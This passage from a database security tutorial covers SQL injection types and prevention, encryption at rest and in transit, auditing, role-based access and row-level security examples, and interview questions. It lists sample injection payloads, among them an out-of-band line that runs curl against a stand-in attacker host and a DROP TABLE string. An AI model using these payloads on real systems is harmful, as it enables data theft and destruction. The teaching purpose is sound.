### Types of SQL Injection

| Type | Description | Example Payload |
|---|---|---|
| **Classic (in-band)** | Result visible in response | `' OR '1'='1` |
| **UNION-based** | Piggyback a second query | `' UNION SELECT password FROM users --` |
| **Blind (boolean)** | No data returned; infer from true/false | `' AND 1=1 --` vs `' AND 1=2 --` |
| **Time-based blind** | Infer from response delay | `'; SELECT pg_sleep(5); --` |
| **Second-order** | Payload stored, executes later | Stored in DB, triggers when read |
| **Out-of-band** | Data exfiltrated via DNS/HTTP | `'; COPY TO PROGRAM 'curl attacker.com' --` |

### Prevention — The Complete Checklist

**1. Parameterized Queries (Prepared Statements) — PRIMARY DEFENCE**

```python
# ✅ Python (psycopg2) — parameterized
cursor.execute("SELECT * FROM users WHERE name = %s", (user_input,))

# ✅ Python (SQLAlchemy)
result = session.execute(text("SELECT * FROM users WHERE name = :name"),
                          {"name": user_input})

# ❌ NEVER concatenate
cursor.execute(f"SELECT * FROM users WHERE name = '{user_input}'")
```

```java
// ✅ Java (JDBC) — PreparedStatement
PreparedStatement stmt = conn.prepareStatement(
    "SELECT * FROM users WHERE name = ?");
stmt.setString(1, userInput);

// ❌ NEVER
Statement stmt = conn.createStatement();
stmt.executeQuery("SELECT * FROM users WHERE name = '" + userInput + "'");
```

```javascript
// ✅ Node.js (pg)
const result = await pool.query(
    'SELECT * FROM users WHERE name = $1', [userInput]);

// ❌ NEVER
const result = await pool.query(
    `SELECT * FROM users WHERE name = '${userInput}'`);
```

**2. Stored Procedures (as an API layer)**

```sql
-- App calls: CALL get_user_orders(42);
-- Even if 42 were manipulated, it's typed as INT — injection impossible
CREATE PROCEDURE get_user_orders(p_user_id INT)
LANGUAGE plpgsql AS $$
BEGIN
    -- Parameterised inside the procedure
    RETURN QUERY SELECT * FROM orders WHERE user_id = p_user_id;
END;
$$;
```

**3. Input Validation (defence in depth)**

```python
# Whitelist allowed values for non-parameterisable parts (table names, ORDER BY)
ALLOWED_SORT_COLUMNS = {'name', 'salary', 'hire_date'}
if sort_column not in ALLOWED_SORT_COLUMNS:
    raise ValueError(f"Invalid sort column: {sort_column}")
```

**4. Least Privilege (limit blast radius)**

```sql
-- App user can only SELECT/INSERT/UPDATE, never DROP or ALTER
GRANT SELECT, INSERT, UPDATE ON orders TO app_user;
REVOKE ALL ON pg_catalog.pg_proc FROM app_user;
```

**5. WAF / SQL Firewall**

```
-- pgAudit + pg_query_normalise for pattern detection
-- AWS WAF SQL injection rule sets
-- Application-level ORM query logging
```

### Prevention Summary

<svg viewBox="0 0 700 170" xmlns="http://www.w3.org/2000/svg" style="max-width:700px; font-family:Arial,sans-serif;">
  <text x="350" y="22" text-anchor="middle" font-size="14" font-weight="bold" fill="#1a1a2e">SQL Injection Prevention Layers</text>

  <rect x="20" y="40" width="130" height="55" rx="8" fill="#c8e6c9" stroke="#2e7d32" stroke-width="2"/>
  <text x="85" y="63" text-anchor="middle" font-size="10" font-weight="bold" fill="#2e7d32">Layer 1</text>
  <text x="85" y="80" text-anchor="middle" font-size="10" fill="#333">Parameterised</text>
  <text x="85" y="92" text-anchor="middle" font-size="10" fill="#333">Queries</text>

  <rect x="160" y="40" width="130" height="55" rx="8" fill="#bbdefb" stroke="#1565c0" stroke-width="2"/>
  <text x="225" y="63" text-anchor="middle" font-size="10" font-weight="bold" fill="#1565c0">Layer 2</text>
  <text x="225" y="80" text-anchor="middle" font-size="10" fill="#333">Input</text>
  <text x="225" y="92" text-anchor="middle" font-size="10" fill="#333">Validation</text>

  <rect x="300" y="40" width="130" height="55" rx="8" fill="#fff9c4" stroke="#f9a825" stroke-width="2"/>
  <text x="365" y="63" text-anchor="middle" font-size="10" font-weight="bold" fill="#f9a825">Layer 3</text>
  <text x="365" y="80" text-anchor="middle" font-size="10" fill="#333">Least Privilege</text>
  <text x="365" y="92" text-anchor="middle" font-size="10" fill="#333">DB Accounts</text>

  <rect x="440" y="40" width="120" height="55" rx="8" fill="#e1bee7" stroke="#6a1b9a" stroke-width="2"/>
  <text x="500" y="63" text-anchor="middle" font-size="10" font-weight="bold" fill="#6a1b9a">Layer 4</text>
  <text x="500" y="80" text-anchor="middle" font-size="10" fill="#333">WAF / SQL</text>
  <text x="500" y="92" text-anchor="middle" font-size="10" fill="#333">Firewall</text>

  <rect x="570" y="40" width="110" height="55" rx="8" fill="#ffccbc" stroke="#e65100" stroke-width="2"/>
  <text x="625" y="63" text-anchor="middle" font-size="10" font-weight="bold" fill="#e65100">Layer 5</text>
  <text x="625" y="80" text-anchor="middle" font-size="10" fill="#333">Audit</text>
  <text x="625" y="92" text-anchor="middle" font-size="10" fill="#333">Logging</text>

  <rect x="20" y="110" width="660" height="45" rx="6" fill="#ffebee" stroke="#c62828" stroke-width="1.5"/>
  <text x="350" y="132" text-anchor="middle" font-size="12" font-weight="bold" fill="#c62828">The Golden Rule</text>
  <text x="350" y="148" text-anchor="middle" font-size="11" fill="#333">NEVER concatenate user input into SQL strings. Use parameterised queries. Always. No exceptions.</text>
</svg>

---

## 9. Encryption — At Rest & In Transit

### Encryption at Rest

| Method | Scope | Managed By |
|---|---|---|
| **Transparent Data Encryption (TDE)** | Encrypts entire data files on disk | Database engine (SQL Server, Oracle, MySQL) |
| **PostgreSQL pgcrypto** | Column-level encryption in SQL | Application / SQL |
| **Full-Disk Encryption (FDE)** | Encrypts entire disk volume | OS (LUKS, BitLocker, FileVault) |
| **Cloud KMS** | Key management for any encryption | AWS KMS, Azure Key Vault, GCP KMS |

### PostgreSQL — Column-Level Encryption with pgcrypto

```sql
-- Enable extension
CREATE EXTENSION IF NOT EXISTS pgcrypto;

-- Encrypt sensitive data
INSERT INTO customers(name, ssn_encrypted)
VALUES (
    'Alice Johnson',
    pgp_sym_encrypt('123-45-6789', 'my-secret-key')
);

-- Decrypt (only users who know the key)
SELECT name,
       pgp_sym_decrypt(ssn_encrypted, 'my-secret-key') AS ssn
  FROM customers;
```

### SQL Server — Transparent Data Encryption

```sql
-- Create a master key
CREATE MASTER KEY ENCRYPTION BY PASSWORD = 'StrongP@ssw0rd!';

-- Create a certificate
CREATE CERTIFICATE TDE_Cert WITH SUBJECT = 'TDE Certificate';

-- Create a database encryption key
CREATE DATABASE ENCRYPTION KEY
    WITH ALGORITHM = AES_256
    ENCRYPTION BY SERVER CERTIFICATE TDE_Cert;

-- Enable TDE
ALTER DATABASE MyDatabase SET ENCRYPTION ON;
```

### Encryption in Transit (TLS/SSL)

| RDBMS | Configuration |
|---|---|
| **PostgreSQL** | `ssl = on` in `postgresql.conf`, client uses `sslmode=verify-full` |
| **MySQL** | `require_secure_transport = ON`, `--ssl-ca`, `--ssl-cert`, `--ssl-key` |
| **SQL Server** | Force encryption in SQL Server Configuration Manager |
| **Oracle** | Oracle Net encryption (native or TLS) |

### PostgreSQL TLS Configuration

```ini
# postgresql.conf
ssl = on
ssl_cert_file = '/etc/ssl/certs/server.crt'
ssl_key_file = '/etc/ssl/private/server.key'
ssl_ca_file = '/etc/ssl/certs/ca.crt'
ssl_min_protocol_version = 'TLSv1.3'
```

```ini
# pg_hba.conf — require SSL for remote connections
hostssl  all  all  0.0.0.0/0  scram-sha-256
```

```python
# Python client — verify server certificate
conn = psycopg2.connect(
    host='db.example.com',
    sslmode='verify-full',
    sslrootcert='/etc/ssl/certs/ca.crt'
)
```

<svg viewBox="0 0 750 200" xmlns="http://www.w3.org/2000/svg" style="max-width:750px; font-family:Arial,sans-serif;">
  <defs>
    <marker id="arrowEnc" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto">
      <path d="M0,0 L8,3 L0,6 Z" fill="#2e7d32"/>
    </marker>
  </defs>

  <text x="375" y="22" text-anchor="middle" font-size="15" font-weight="bold" fill="#1a1a2e">Encryption — At Rest vs In Transit</text>

  <!-- App -->
  <rect x="30" y="50" width="120" height="60" rx="8" fill="#e3f2fd" stroke="#1565c0" stroke-width="2"/>
  <text x="90" y="77" text-anchor="middle" font-size="12" font-weight="bold" fill="#1565c0">Application</text>
  <text x="90" y="96" text-anchor="middle" font-size="10" fill="#555">Plaintext</text>

  <!-- In transit -->
  <rect x="175" y="55" width="180" height="50" rx="8" fill="#e8f5e9" stroke="#2e7d32" stroke-width="2" stroke-dasharray="6,3"/>
  <text x="265" y="77" text-anchor="middle" font-size="11" font-weight="bold" fill="#2e7d32">TLS 1.3 Tunnel</text>
  <text x="265" y="94" text-anchor="middle" font-size="10" fill="#555">Encrypted in transit</text>
  <line x1="150" y1="80" x2="175" y2="80" stroke="#2e7d32" stroke-width="2" marker-end="url(#arrowEnc)"/>
  <line x1="355" y1="80" x2="400" y2="80" stroke="#2e7d32" stroke-width="2" marker-end="url(#arrowEnc)"/>

  <!-- DB Engine -->
  <rect x="405" y="50" width="140" height="60" rx="8" fill="#fff3e0" stroke="#e65100" stroke-width="2"/>
  <text x="475" y="77" text-anchor="middle" font-size="12" font-weight="bold" fill="#e65100">DB Engine</text>
  <text x="475" y="96" text-anchor="middle" font-size="10" fill="#555">Decrypts → processes</text>

  <!-- At rest -->
  <line x1="475" y1="110" x2="475" y2="135" stroke="#6a1b9a" stroke-width="2"/>
  <rect x="390" y="135" width="170" height="50" rx="8" fill="#f3e5f5" stroke="#6a1b9a" stroke-width="2"/>
  <text x="475" y="157" text-anchor="middle" font-size="11" font-weight="bold" fill="#6a1b9a">Disk (TDE / FDE)</text>
  <text x="475" y="174" text-anchor="middle" font-size="10" fill="#555">Encrypted at rest</text>

  <!-- Column-level -->
  <rect x="590" y="50" width="140" height="60" rx="8" fill="#fce4ec" stroke="#c62828" stroke-width="2"/>
  <text x="660" y="72" text-anchor="middle" font-size="10" font-weight="bold" fill="#c62828">Column-Level</text>
  <text x="660" y="88" text-anchor="middle" font-size="10" fill="#555">pgcrypto / Always</text>
  <text x="660" y="100" text-anchor="middle" font-size="10" fill="#555">Encrypted (SQL Server)</text>
</svg>

---

## 10. Auditing & Monitoring

### PostgreSQL — pgAudit Extension

```sql
-- Install
CREATE EXTENSION pgaudit;

-- Configure in postgresql.conf
-- pgaudit.log = 'read, write, ddl'
-- pgaudit.log_relation = on

-- Object-level audit
ALTER ROLE auditor SET pgaudit.log = 'all';

-- Sample audit log entry:
-- AUDIT: SESSION,1,1,READ,SELECT,TABLE,public.employees,
--        "SELECT * FROM employees WHERE salary > 100000"
```

### SQL Server — Built-in Audit

```sql
-- Create a server audit
CREATE SERVER AUDIT SecurityAudit
    TO FILE (FILEPATH = 'C:\AuditLogs\', MAXSIZE = 100 MB);

ALTER SERVER AUDIT SecurityAudit WITH (STATE = ON);

-- Create a database audit specification
CREATE DATABASE AUDIT SPECIFICATION AuditSensitiveData
    FOR SERVER AUDIT SecurityAudit
    ADD (SELECT ON employees BY public),
    ADD (UPDATE ON employees BY public)
    WITH (STATE = ON);
```

### What to Audit

| Category | Events to Log |
|---|---|
| **Authentication** | Successful/failed logins, connection source IP |
| **Privilege changes** | GRANT, REVOKE, role membership changes |
| **Schema changes** | CREATE, ALTER, DROP on tables, indexes, functions |
| **Sensitive data access** | SELECT on PII tables (employees, customers) |
| **Data modifications** | INSERT, UPDATE, DELETE on financial tables |
| **Admin operations** | COPY, pg_dump, configuration changes, superuser actions |

---

## 11. Multi-Database Security Reference

| Feature | PostgreSQL | SQL Server | MySQL | Oracle |
|---|---|---|---|---|
| **Authentication config** | `pg_hba.conf` | Login + SQL Auth | `CREATE USER … IDENTIFIED BY` | `sqlnet.ora` + wallet |
| **Auth methods** | peer, scram, cert, ldap, gss | Windows, SQL, Azure AD | native, PAM, LDAP | password, Kerberos, RADIUS |
| **Roles** | `CREATE ROLE` | `CREATE ROLE` | `CREATE ROLE` | `CREATE ROLE` |
| **Column-level GRANT** | `GRANT SELECT(col)` | `GRANT SELECT ON … (col)` | `GRANT SELECT(col)` | `GRANT SELECT(col)` (12c+) |
| **Row-Level Security** | `CREATE POLICY` | `SECURITY POLICY` + filter fn | No native (use views) | VPD (Virtual Private DB) |
| **DENY** | Not available | `DENY` | Not available | Not available |
| **Data masking** | Custom functions | Dynamic Data Masking | Not native | Data Redaction |
| **TDE** | Not built-in (use FDE) | Built-in TDE | InnoDB tablespace encryption | Built-in TDE |
| **Column encryption** | pgcrypto extension | Always Encrypted | AES_ENCRYPT() | DBMS_CRYPTO |
| **Audit** | pgAudit extension | Built-in Audit | General / audit log plugin | Unified Auditing |
| **SSL/TLS** | `ssl = on` | Configuration Manager | `require_secure_transport` | Oracle Net TLS |

---

## 12. Worked Examples

### Example 1 — Beginner: Complete RBAC Setup for a Student Database

```sql
-- PostgreSQL: University database with three access tiers

-- 1. Create roles
CREATE ROLE student_readonly NOLOGIN;
CREATE ROLE professor_readwrite NOLOGIN;
CREATE ROLE registrar_admin NOLOGIN;

-- 2. Grant schema access
GRANT USAGE ON SCHEMA university TO student_readonly, professor_readwrite, registrar_admin;

-- 3. Student: can see courses and their own grades
GRANT SELECT ON courses, departments TO student_readonly;
GRANT SELECT (student_id, course_id, grade, semester) ON grades TO student_readonly;

-- 4. Professor: can read all, update grades
GRANT SELECT ON ALL TABLES IN SCHEMA university TO professor_readwrite;
GRANT UPDATE (grade, comments) ON grades TO professor_readwrite;
GRANT INSERT ON grades TO professor_readwrite;

-- 5. Registrar: full control
GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA university TO registrar_admin;
GRANT ALL PRIVILEGES ON ALL SEQUENCES IN SCHEMA university TO registrar_admin;

-- 6. Create users and assign
CREATE ROLE alice LOGIN PASSWORD 'alice_secure_pass';
GRANT student_readonly TO alice;

CREATE ROLE prof_smith LOGIN PASSWORD 'smith_secure_pass';
GRANT professor_readwrite TO prof_smith;

CREATE ROLE admin_jones LOGIN PASSWORD 'jones_secure_pass';
GRANT registrar_admin TO admin_jones;

-- 7. Future-proof with default privileges
ALTER DEFAULT PRIVILEGES IN SCHEMA university
    GRANT SELECT ON TABLES TO student_readonly;
```

### Example 2 — Beginner: Preventing SQL Injection

```python
# ❌ VULNERABLE — string concatenation
def get_student_vulnerable(student_name):
    query = f"SELECT * FROM students WHERE name = '{student_name}'"
    cursor.execute(query)
    # Input: "'; DROP TABLE students; --"
    # Becomes: SELECT * FROM students WHERE name = ''; DROP TABLE students; --'

# ✅ SAFE — parameterised query
def get_student_safe(student_name):
    cursor.execute(
        "SELECT * FROM students WHERE name = %s",
        (student_name,)
    )
    # Input: "'; DROP TABLE students; --"
    # Parameter is treated as a string value, never as SQL code

# ✅ SAFE — dynamic ORDER BY with whitelist
ALLOWED_COLUMNS = {'name', 'gpa', 'enrollment_date'}
def get_students_sorted(sort_by):
    if sort_by not in ALLOWED_COLUMNS:
        sort_by = 'name'  # safe default
    cursor.execute(f"SELECT * FROM students ORDER BY {sort_by}")
```

### Example 3 — Intermediate: Multi-Tenant RLS for E-Commerce

```sql
-- PostgreSQL: SaaS e-commerce — each store is a tenant

-- 1. Enable RLS
ALTER TABLE products ENABLE ROW LEVEL SECURITY;
ALTER TABLE orders   ENABLE ROW LEVEL SECURITY;
ALTER TABLE customers ENABLE ROW LEVEL SECURITY;

-- 2. Policies for store isolation
CREATE POLICY store_products ON products
    USING (store_id = current_setting('app.store_id')::INT);

CREATE POLICY store_orders ON orders
    USING (store_id = current_setting('app.store_id')::INT);

CREATE POLICY store_customers ON customers
    USING (store_id = current_setting('app.store_id')::INT);

-- 3. Insert policy — can only insert into own store
CREATE POLICY insert_own_products ON products
    FOR INSERT
    WITH CHECK (store_id = current_setting('app.store_id')::INT);

-- 4. App sets context on each request
-- In connection pool middleware:
SET app.store_id = '42';

-- 5. Now queries are automatically filtered
SELECT * FROM products;
-- → Only returns products WHERE store_id = 42

INSERT INTO products(store_id, name, price)
VALUES (99, 'Hack', 0.01);
-- → ERROR: new row violates row-level security policy

-- 6. Admin bypass role
CREATE ROLE platform_admin NOLOGIN BYPASSRLS;
GRANT platform_admin TO super_admin_user;
```

### Example 4 — Intermediate: Sensitive Data Protection

```sql
-- PostgreSQL: Protect employee PII with layered security

-- 1. Column-level encryption for SSN
CREATE EXTENSION IF NOT EXISTS pgcrypto;

CREATE TABLE employees (
    id          SERIAL PRIMARY KEY,
    name        TEXT NOT NULL,
    department  TEXT NOT NULL,
    salary      NUMERIC(12,2),
    ssn_enc     BYTEA,  -- encrypted SSN
    hire_date   DATE
);

-- Insert with encryption
INSERT INTO employees(name, department, salary, ssn_enc, hire_date)
VALUES (
    'Alice Johnson', 'Engineering', 95000,
    pgp_sym_encrypt('123-45-6789', current_setting('app.encryption_key')),
    '2024-03-15'
);

-- 2. View for non-sensitive access
CREATE VIEW employees_public AS
SELECT id, name, department, hire_date
  FROM employees;

-- 3. Function for authorised SSN access (with audit)
CREATE OR REPLACE FUNCTION get_employee_ssn(p_emp_id INT)
RETURNS TEXT
LANGUAGE plpgsql
SECURITY DEFINER  -- runs with function owner's privileges
AS $$
DECLARE
    v_ssn TEXT;
BEGIN
    -- Audit the access
    INSERT INTO pii_access_log(employee_id, accessed_by, accessed_at)
    VALUES (p_emp_id, current_user, NOW());

    SELECT pgp_sym_decrypt(ssn_enc, current_setting('app.encryption_key'))
      INTO v_ssn
      FROM employees
     WHERE id = p_emp_id;

    RETURN v_ssn;
END;
$$;

-- Only HR can call this function
REVOKE ALL ON FUNCTION get_employee_ssn(INT) FROM PUBLIC;
GRANT EXECUTE ON FUNCTION get_employee_ssn(INT) TO hr_role;
```

### Example 5 — Advanced: Complete Audit Trigger System

```sql
-- PostgreSQL: Generic audit trigger for any table

CREATE TABLE audit_log (
    audit_id     BIGSERIAL PRIMARY KEY,
    table_name   TEXT NOT NULL,
    operation    TEXT NOT NULL,
    row_id       TEXT,
    old_data     JSONB,
    new_data     JSONB,
    changed_by   TEXT DEFAULT current_user,
    client_addr  INET DEFAULT inet_client_addr(),
    app_name     TEXT DEFAULT current_setting('application_name'),
    changed_at   TIMESTAMPTZ DEFAULT NOW()
);

CREATE OR REPLACE FUNCTION audit_trigger_func()
RETURNS TRIGGER
LANGUAGE plpgsql
SECURITY DEFINER
AS $$
DECLARE
    v_row_id TEXT;
BEGIN
    -- Try to extract the primary key value
    IF TG_OP = 'DELETE' THEN
        v_row_id := OLD.id::TEXT;
        INSERT INTO audit_log(table_name, operation, row_id, old_data)
        VALUES (TG_TABLE_NAME, TG_OP, v_row_id, to_jsonb(OLD));
        RETURN OLD;
    ELSIF TG_OP = 'INSERT' THEN
        v_row_id := NEW.id::TEXT;
        INSERT INTO audit_log(table_name, operation, row_id, new_data)
        VALUES (TG_TABLE_NAME, TG_OP, v_row_id, to_jsonb(NEW));
        RETURN NEW;
    ELSIF TG_OP = 'UPDATE' THEN
        v_row_id := NEW.id::TEXT;
        INSERT INTO audit_log(table_name, operation, row_id, old_data, new_data)
        VALUES (TG_TABLE_NAME, TG_OP, v_row_id, to_jsonb(OLD), to_jsonb(NEW));
        RETURN NEW;
    END IF;
    RETURN NULL;
END;
$$;

-- Apply to sensitive tables
CREATE TRIGGER audit_employees
    AFTER INSERT OR UPDATE OR DELETE ON employees
    FOR EACH ROW EXECUTE FUNCTION audit_trigger_func();

CREATE TRIGGER audit_orders
    AFTER INSERT OR UPDATE OR DELETE ON orders
    FOR EACH ROW EXECUTE FUNCTION audit_trigger_func();

-- Query audit trail
SELECT operation, changed_by, changed_at,
       old_data->>'salary' AS old_salary,
       new_data->>'salary' AS new_salary
  FROM audit_log
 WHERE table_name = 'employees'
   AND operation = 'UPDATE'
 ORDER BY changed_at DESC
 LIMIT 10;
```

### Example 6 — Advanced: Hierarchical RBAC with Role Inheritance

```sql
-- PostgreSQL: Banking application with nested roles

-- Base roles (finest granularity)
CREATE ROLE can_view_accounts NOLOGIN;
CREATE ROLE can_view_transactions NOLOGIN;
CREATE ROLE can_create_transactions NOLOGIN;
CREATE ROLE can_approve_large_transactions NOLOGIN;
CREATE ROLE can_manage_users NOLOGIN;
CREATE ROLE can_view_audit_log NOLOGIN;

-- Composite roles (inherit from base roles)
CREATE ROLE bank_teller NOLOGIN;
GRANT can_view_accounts TO bank_teller;
GRANT can_view_transactions TO bank_teller;
GRANT can_create_transactions TO bank_teller;

CREATE ROLE bank_manager NOLOGIN;
GRANT bank_teller TO bank_manager;                    -- inherits teller privileges
GRANT can_approve_large_transactions TO bank_manager;

CREATE ROLE compliance_officer NOLOGIN;
GRANT can_view_accounts TO compliance_officer;
GRANT can_view_transactions TO compliance_officer;
GRANT can_view_audit_log TO compliance_officer;

CREATE ROLE bank_admin NOLOGIN;
GRANT bank_manager TO bank_admin;
GRANT compliance_officer TO bank_admin;
GRANT can_manage_users TO bank_admin;

-- Grant actual privileges to base roles
GRANT SELECT ON accounts TO can_view_accounts;
GRANT SELECT ON transactions TO can_view_transactions;
GRANT INSERT ON transactions TO can_create_transactions;
GRANT UPDATE (status) ON transactions TO can_approve_large_transactions;
GRANT SELECT ON audit_log TO can_view_audit_log;
GRANT SELECT, INSERT, UPDATE ON users TO can_manage_users;

-- Create users
CREATE ROLE sarah LOGIN PASSWORD 'sarah_secure';
GRANT bank_teller TO sarah;

CREATE ROLE mike LOGIN PASSWORD 'mike_secure';
GRANT bank_manager TO mike;

CREATE ROLE lisa LOGIN PASSWORD 'lisa_secure';
GRANT bank_admin TO lisa;

-- Verify privileges
SELECT grantee, privilege_type, table_name
  FROM information_schema.role_table_grants
 WHERE grantee IN ('can_view_accounts', 'can_create_transactions')
 ORDER BY grantee, table_name;
```

---

## 13. Common Interview Questions

### Q1: What is the difference between authentication and authorization?

**Answer:** **Authentication** verifies identity — "Who are you?" (password, certificate, biometrics). **Authorization** determines permissions — "What can you do?" (GRANT, REVOKE, RLS). Authentication happens first; once identity is established, authorization controls what that identity can access. A user can be authenticated (valid login) but unauthorized (no SELECT on the table).

### Q2: What is SQL injection and how do you prevent it?

**Answer:** SQL injection occurs when untrusted input is concatenated into SQL strings, allowing attackers to modify query logic. Example: input `' OR '1'='1` can bypass authentication.

**Prevention (in order of importance):**
1. **Parameterized queries** — the primary and most effective defence. The database treats parameters as data, never as SQL code.
2. **Input validation** — whitelist allowed values for non-parameterizable parts (column names, sort directions).
3. **Least privilege** — the app's DB account should have minimal permissions.
4. **WAF/SQL firewall** — detect and block known injection patterns.
5. **Stored procedures** — provide a typed API layer.

### Q3: Explain GRANT, REVOKE, and DENY.

**Answer:**
- **GRANT**: Gives a privilege to a user or role. `GRANT SELECT ON employees TO analyst;`
- **REVOKE**: Removes a previously granted privilege. `REVOKE SELECT ON employees FROM analyst;`
- **DENY** (SQL Server only): Explicitly blocks a privilege, overriding any GRANT — even through role inheritance. Useful for exceptions: grant SELECT to a role but DENY SELECT on the salary column for interns.

Precedence in SQL Server: **DENY > GRANT > no permission**. PostgreSQL has no DENY; you achieve similar results by revoking from the user directly or restructuring roles.

### Q4: What is Role-Based Access Control (RBAC)?

**Answer:** RBAC assigns privileges to **roles** (representing job functions), then assigns users to roles — rather than granting directly to each user. Benefits:
- **Scalable**: Add a new hire by granting one role, not 50 individual privileges
- **Auditable**: Review what each role can do centrally
- **Maintainable**: Change privileges for all analysts by modifying one role
- **Principle of least privilege**: Each role has only what it needs

Example roles: `readonly_analyst`, `app_readwrite`, `hr_sensitive`, `dba_admin`.

### Q5: What is Row-Level Security (RLS)?

**Answer:** RLS allows the database to automatically filter rows based on the user's identity or context. You define policies on a table, and the engine adds invisible `WHERE` clauses to every query. Example: in a multi-tenant SaaS app, `tenant_id = current_tenant` is automatically applied, so Tenant A never sees Tenant B's data — even if the application has a bug that forgets the filter.

PostgreSQL uses `CREATE POLICY`, SQL Server uses `SECURITY POLICY` with predicate functions, and Oracle uses Virtual Private Database (VPD).

### Q6: What is Transparent Data Encryption (TDE)?

**Answer:** TDE encrypts database files on disk so that if someone steals the physical storage (disk, backup tape), the data is unreadable without the encryption key. TDE is **transparent** because the database engine handles encryption/decryption automatically — no application changes needed. SQL Server, Oracle, and MySQL (InnoDB) support TDE natively. PostgreSQL relies on file-system-level encryption (LUKS/dm-crypt) or the pgcrypto extension for column-level encryption.

### Q7: What is the difference between encryption at rest and encryption in transit?

**Answer:**
- **At rest**: Protects data stored on disk (TDE, FDE, column-level encryption). Defends against physical theft or unauthorized file access.
- **In transit**: Protects data moving between client and server over the network (TLS/SSL). Defends against network sniffing, man-in-the-middle attacks.

A complete security posture requires **both** — TLS for the connection and TDE/FDE for the storage.

### Q8: What is the principle of least privilege?

**Answer:** Every user and application should have the **minimum permissions** necessary to perform their function — no more. Implementation:
- Analysts get `SELECT` only, not `INSERT`/`UPDATE`/`DELETE`
- Application accounts cannot `DROP TABLE` or `ALTER SCHEMA`
- `REVOKE ALL FROM PUBLIC` on sensitive schemas
- No one uses the `superuser` / `sa` account for regular work
- Temporary access expires with `VALID UNTIL`

This limits the blast radius: if an account is compromised, the attacker can only do what that account was permitted to do.

### Q9: How does `SECURITY DEFINER` work in PostgreSQL functions?

**Answer:** A `SECURITY DEFINER` function runs with the privileges of the **function owner**, not the calling user. This is similar to `setuid` in Unix. Use case: a function that decrypts PII — the calling user doesn't need direct access to the encrypted table; the function (owned by a privileged role) accesses the table on their behalf. Always pair with:
- `REVOKE ALL ON FUNCTION … FROM PUBLIC` to control who can call it
- Input validation to prevent misuse
- Audit logging inside the function

### Q10: What should a database audit trail capture?

**Answer:** At minimum:
- **Who**: The database user and application user (if different)
- **What**: The operation (SELECT, INSERT, UPDATE, DELETE, DDL) and affected objects
- **When**: Timestamp
- **Where**: Client IP address, application name
- **How**: The actual SQL statement (or a normalized version)
- **Old/New values**: For UPDATE and DELETE, capture the before and after state

PostgreSQL: use pgAudit + trigger-based audit for row-level detail. SQL Server: built-in audit. All: store audit logs in a separate, append-only table/schema that the application account cannot modify.

### Q11: How do you protect against privilege escalation?

**Answer:**
1. **Don't grant WITH GRANT OPTION** unless absolutely necessary — it allows a user to re-grant privileges to others
2. **Review role memberships** regularly — a role with `CREATEROLE` can create powerful roles
3. **No shared superuser accounts** — every admin gets their own account
4. **Monitor pg_auth_members / sys.database_role_members** for unexpected changes
5. **Separate duty** — the person who writes data shouldn't also grant access

### Q12: What is the difference between view-based security and RLS?

**Answer:**
- **Views**: Create restricted views that exclude sensitive columns/rows, grant access to the view only. Pros: simple, portable. Cons: must maintain views for every access pattern; can be bypassed if someone gets access to the base table.
- **RLS**: Policies on the base table that filter rows transparently. Pros: no extra views, can't be bypassed (even by direct table access), policies can use session context (tenant_id, user role). Cons: more complex to set up, not available in all RDBMS (MySQL lacks native RLS).

Best practice: use **both** — views for column restriction, RLS for row restriction.

---

## 14. Key Takeaways

<svg viewBox="0 0 750 500" xmlns="http://www.w3.org/2000/svg" style="max-width:750px; font-family:Arial,sans-serif;">
  <text x="375" y="28" text-anchor="middle" font-size="17" font-weight="bold" fill="#1a1a2e">Phase 16 — Key Takeaways</text>

  <!-- Card 1 -->
  <rect x="20" y="50" width="340" height="80" rx="10" fill="#e3f2fd" stroke="#1565c0" stroke-width="2"/>
  <text x="40" y="75" font-size="13" font-weight="bold" fill="#1565c0">AuthN ≠ AuthZ</text>
  <text x="40" y="95" font-size="11" fill="#333">Authentication = who you are.</text>
  <text x="40" y="112" font-size="11" fill="#333">Authorization = what you can do.</text>

  <!-- Card 2 -->
  <rect x="390" y="50" width="340" height="80" rx="10" fill="#e8f5e9" stroke="#2e7d32" stroke-width="2"/>
  <text x="410" y="75" font-size="13" font-weight="bold" fill="#2e7d32">RBAC > Direct Grants</text>
  <text x="410" y="95" font-size="11" fill="#333">Grant to roles, assign users to roles.</text>
  <text x="410" y="112" font-size="11" fill="#333">Scalable, auditable, maintainable.</text>

  <!-- Card 3 -->
  <rect x="20" y="150" width="340" height="80" rx="10" fill="#ffebee" stroke="#c62828" stroke-width="2"/>
  <text x="40" y="175" font-size="13" font-weight="bold" fill="#c62828">SQLi = #1 Threat → Parameterise!</text>
  <text x="40" y="195" font-size="11" fill="#333">NEVER concatenate user input into SQL.</text>
  <text x="40" y="212" font-size="11" fill="#333">Use prepared statements. No exceptions.</text>

  <!-- Card 4 -->
  <rect x="390" y="150" width="340" height="80" rx="10" fill="#fff3e0" stroke="#e65100" stroke-width="2"/>
  <text x="410" y="175" font-size="13" font-weight="bold" fill="#e65100">RLS = Invisible Row Filtering</text>
  <text x="410" y="195" font-size="11" fill="#333">Policies enforce row access at the engine</text>
  <text x="410" y="212" font-size="11" fill="#333">level. App bugs can't bypass it.</text>

  <!-- Card 5 -->
  <rect x="20" y="250" width="340" height="80" rx="10" fill="#f3e5f5" stroke="#6a1b9a" stroke-width="2"/>
  <text x="40" y="275" font-size="13" font-weight="bold" fill="#6a1b9a">Encrypt Both Layers</text>
  <text x="40" y="295" font-size="11" fill="#333">At rest (TDE/FDE) + in transit (TLS).</text>
  <text x="40" y="312" font-size="11" fill="#333">Column-level for extra-sensitive fields.</text>

  <!-- Card 6 -->
  <rect x="390" y="250" width="340" height="80" rx="10" fill="#fff9c4" stroke="#f9a825" stroke-width="2"/>
  <text x="410" y="275" font-size="13" font-weight="bold" fill="#f9a825">Least Privilege Always</text>
  <text x="410" y="295" font-size="11" fill="#333">Grant minimum access. Revoke public</text>
  <text x="410" y="312" font-size="11" fill="#333">defaults. Expire temporary access.</text>

  <!-- Card 7 -->
  <rect x="20" y="350" width="340" height="80" rx="10" fill="#e0f2f1" stroke="#00695c" stroke-width="2"/>
  <text x="40" y="375" font-size="13" font-weight="bold" fill="#00695c">Audit Everything Sensitive</text>
  <text x="40" y="395" font-size="11" fill="#333">Who accessed what, when, from where.</text>
  <text x="40" y="412" font-size="11" fill="#333">Append-only log the app can't modify.</text>

  <!-- Card 8 -->
  <rect x="390" y="350" width="340" height="80" rx="10" fill="#ffccbc" stroke="#bf360c" stroke-width="2"/>
  <text x="410" y="375" font-size="13" font-weight="bold" fill="#bf360c">Defence in Depth</text>
